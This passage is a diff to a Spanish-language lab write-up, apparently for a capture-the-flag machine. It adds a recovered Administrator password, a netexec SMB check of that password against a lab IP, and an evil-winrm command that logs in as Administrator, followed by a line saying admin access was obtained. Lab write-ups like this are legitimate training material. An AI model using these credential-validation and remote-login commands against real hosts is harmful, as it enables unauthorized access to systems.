@@ -379,8 +379,16 @@ Y obtenemos la password `baCT3r1aN00dles` del supuesto usuario `Administrator` y
 nxc smb 10.129.9.250 -u 'Administrator' -p 'baCT3r1aN00dles'
 ```
 
-Verificamos que la contraseña es valida y miramos si puede acceder por [[EVIL-WINRM]]
+```ad-hint
+Administrator-baCT3r1aN00dles
+```
 
+Verificamos que la contraseña es valida y miramos si puede acceder por [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.9.250 -u 'Administrator' -p 'baCT3r1aN00dles'
+```
+
+Obteniendo acceso a la maquina como usuario Administrator
 
 
 
